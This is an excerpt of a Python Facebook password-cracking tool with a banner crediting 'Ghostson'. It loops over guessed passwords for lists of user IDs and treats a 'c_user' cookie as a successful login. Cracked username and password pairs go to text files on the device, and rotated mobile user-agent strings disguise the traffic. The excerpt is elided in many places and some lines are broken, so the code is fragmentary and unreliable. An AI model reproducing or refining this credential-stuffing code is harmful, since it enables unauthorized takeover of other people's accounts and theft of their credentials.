...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m{ CRACKING } \033[1;97m%s/%s   \033[1;97m{ OK-:%s }  \033[1;97m{ CP-:%s } '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;97m{GHOSTED-OK} %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/GHOSTED_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/GHOSTED_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;97m{GHOSTED-CP} %s | %s%s      ' % (user,pw,tahun(user)))
...
imtiazak_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozi
...
imtiazak_ua_blackberry = 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en-GB) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.600 Mobile Safari/534.8+'
imtiazak_ua_tecno = 'Mozilla/5.0 (Linux; Android 4.4.2; TECNO-Y2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.31 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; TECNO KD7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
imtiazak_ua_infinix = 'Mozilla/5.0 (Linux; Android 11; Infinix X695D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36'
imtiazak_ua_realme = 'Mozilla/5.0 (Linux; Android 11; RMX1971) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36'
imtiazak_ua_smarttv = 'Mozilla/5.0 (SMART-TV; Linux; Tizen 2.3) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.0 TV Safari/538.1'
imtiazak_ua_iphone = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1'
imtiazak_ua_lg = 'Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:96.0) Gecko/96.0 Firefox/96.0'
imtiazak_ua_xiaomi = 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36'
banner="""\033[1;95m   
\033[1;97m /$$$$$$$  /$$$$$$$$ /$$    /$$ /$$$$$$ /$$      
...
\033[1;91m | $$  | $$| $$        \  $$$/    | $$  | $$      
\033[1;91m | $$$$$$$/| $$$$$$$$   \  $/    /$$$$$$| $$$$$$$$
\033[1;37m |_______/ |________/    \_/    |______/|________/
\033[1;91m \033[1;97m════𝐏𝐑𝐎𝐔𝐃 𝐓𝐎 𝐁𝐄 *A CODER*════ \033[1;91m
\033[1;91m \033[1;97m═══════𝐇𝐀𝐏𝐏𝐘  *NIGERIAN*═══════ \033[1;91m
\033[1;91m💔 \033[1;97m═════ANONYMOUS DEVIL═════ \033[1;91m💔

\033[1;37m ═════════════════════════════════════════════════
\033[1;97m AUTHOR    \033[1;97m➵ Ghostson
\033[1;97m FACEBOOK  \033[1;97m➵ Anonymous
\033[1;97m YOUTUBE   \033[1;97m➵ Anonymous
\033[1;97m VERSION   \033[1;97m➵ 10.0
\033[1;97m MOOD       \033[1;97m➵  GHOSTEDMODE
\033[1;37m ═════════════════════════════════════════════════"""
ct = datetime.now()
n = ct.month
